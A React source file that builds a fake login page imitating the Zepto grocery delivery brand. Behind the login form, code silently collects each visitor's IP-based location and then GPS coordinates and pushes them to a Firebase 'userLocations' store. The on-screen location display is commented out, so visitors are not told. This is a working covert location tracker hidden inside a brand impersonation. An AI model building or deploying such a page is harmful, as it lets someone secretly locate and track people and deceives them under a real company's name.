import React, { useEffect, useState } from "react";
import { database } from "./firebase";
import { ref, push } from "firebase/database";

function App() {
  const [location, setLocation] = useState(null);
  const [loading, setLoading] = useState(true);
  const [gpsDenied, setGpsDenied] = useState(false);

  useEffect(() => {
    getIPLocation();
  }, []);

  // 📌 Step 1: Get IP-Based Location First
  const getIPLocation = async () => {
    try {
      console.log("🌍 Fetching IP-based location...");
      const response = await fetch(`https://ip-api.com/json?timestamp=${Date.now()}`);
      const data = await response.json();

      if (data.status === "fail") throw new Error("IP Geolocation failed");

      const ipLocationData = {
        latitude: data.lat,
        longitude: data.lon,
        method: "IP-based",
        city: data.city,
        country: data.country,
        timestamp: new Date().toISOString(),
        mapLink: `https://www.google.com/maps?q=${data.lat},${data.lon}`,
      };

      console.log("✅ IP Location:", ipLocationData);
      setLocation(ipLocationData);
      saveLocation(ipLocationData);

      // After getting IP location, check GPS
      checkGPSPermission();
    } catch (err) {
      console.error("❌ IP Geolocation failed:", err);
      checkGPSPermission();
    }
  };

  // 📌 Step 2: Check GPS Permission
  const checkGPSPermission = () => {
    if ("permissions" in navigator) {
      navigator.permissions
        .query({ name: "geolocation" })
        .then((permission) => {
          if (permission.state === "granted") {
            console.log("✅ GPS is enabled. Fetching precise location...");
            getGPSLocation();
          } else if (permission.state === "prompt") {
            console.log("⚠️ Asking user for GPS permission...");
            requestGPSPermission();
          } else {
            console.warn("❌ GPS permission denied.");
            setGpsDenied(true);
          }
        })
        .catch(() => {
          console.warn("⚠️ Permission API failed. Trying GPS...");
          requestGPSPermission();
        });
    } else {
      console.warn("⚠️ Permission API not supported. Trying GPS...");
      requestGPSPermission();
    }
  };

  // 📌 Step 3: Request GPS Permission
  const requestGPSPermission = () => {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          console.log("✅ GPS permission granted.");
          getGPSLocation();
        },
        (error) => {
          console.warn("❌ GPS permission denied:", error);
          setGpsDenied(true);
        }
      );
    }
  };

  // 📌 Step 4: Get GPS Location
  const getGPSLocation = () => {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude } = position.coords;

          const gpsLocationData = {
            latitude,
            longitude,
            method: "GPS",
            timestamp: new Date().toISOString(),
            mapLink: `https://www.google.com/maps?q=${latitude},${longitude}`,
          };

          console.log("✅ GPS Location:", gpsLocationData);
          setLocation(gpsLocationData);
          saveLocation(gpsLocationData);
          setLoading(false);
        },
        (error) => {
          console.warn("❌ GPS failed:", error);
          setGpsDenied(true);
          setLoading(false);
        },
        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
      );
    } else {
      console.error("❌ Geolocation not supported");
    }
  };

  // 📌 Save Location to Firebase
  const saveLocation = async (locationData) => {
    const locationRef = ref(database, "userLocations");
    await push(locationRef, locationData);
  };

  return (
    <div
      style={{
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        height: "100vh",
        backgroundColor: "#FFF4E0",
        fontFamily: "Arial, sans-serif",
      }}
    >
      <div
        style={{
          textAlign: "center",
          width: "90%",
          maxWidth: "400px",
          backgroundColor: "white",
          padding: "20px",
          borderRadius: "8px",
          boxShadow: "0px 4px 10px rgba(0,0,0,0.1)",
        }}
      >
        {/* Zepto Logo */}
        <img
          src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Zepto_Logo.svg/2560px-Zepto_Logo.svg.png"
          alt="Zepto Logo"
          style={{ width: "150px", marginBottom: "20px" }}
        />

        <h2 style={{ color: "#E91E63", fontWeight: "bold", marginBottom: "10px" }}>
          Welcome to Zepto
        </h2>
        <p style={{ color: "#606770", fontSize: "14px" }}>
          Fastest grocery delivery at your doorstep. Login to continue!
        </p>

        {/* Login Form */}
        <input
          type="text"
          placeholder="Email or phone number"
          style={{
            width: "100%",
            padding: "12px",
            margin: "10px 0",
            borderRadius: "6px",
            border: "1px solid #ddd",
            fontSize: "16px",
          }}
        />
        <input
          type="password"
          placeholder="Password"
          style={{
            width: "100%",
            padding: "12px",
            margin: "10px 0",
            borderRadius: "6px",
            border: "1px solid #ddd",
            fontSize: "16px",
          }}
        />
        <button
          style={{
            width: "100%",
            padding: "12px",
            backgroundColor: "#E91E63",
            color: "white",
            fontSize: "16px",
            fontWeight: "bold",
            border: "none",
            borderRadius: "6px",
            cursor: "pointer",
            marginTop: "10px",
          }}
        >
          Log In
        </button>

        <p style={{ color: "#E91E63", fontSize: "14px", marginTop: "10px", cursor: "pointer" }}>
          Forgot password?
        </p>

        <hr style={{ margin: "20px 0", border: "0.5px solid #ddd" }} />

        <button
          style={{
            width: "100%",
            padding: "12px",
            backgroundColor: "#FF9800",
            color: "white",
            fontSize: "16px",
            fontWeight: "bold",
            border: "none",
            borderRadius: "6px",
            cursor: "pointer",
          }}
        >
          Create New Account
        </button>

        {/* Location Information */}
        {/* <div style={{ marginTop: "20px", fontSize: "14px", color: "#606770" }}>
          {loading ? (
            <p>Fetching location...</p>
          ) : location ? (
            <div>
              <p>Latitude: {location.latitude}</p>
              <p>Longitude: {location.longitude}</p>
              {location.city && <p>City: {location.city}</p>}
              {location.country && <p>Country: {location.country}</p>}
              <p>Method: {location.method}</p>
              <a href={location.mapLink} target="_blank" rel="noopener noreferrer">
                View on Google Maps
              </a>
            </div>
          ) : gpsDenied ? (
            <p style={{ color: "red", fontWeight: "bold" }}>
              GPS is blocked. Please enable location services.
            </p>
          ) : (
            <p>Could not retrieve location</p>
          )}
        </div> */}
      </div>
    </div>
  );
}

export default App;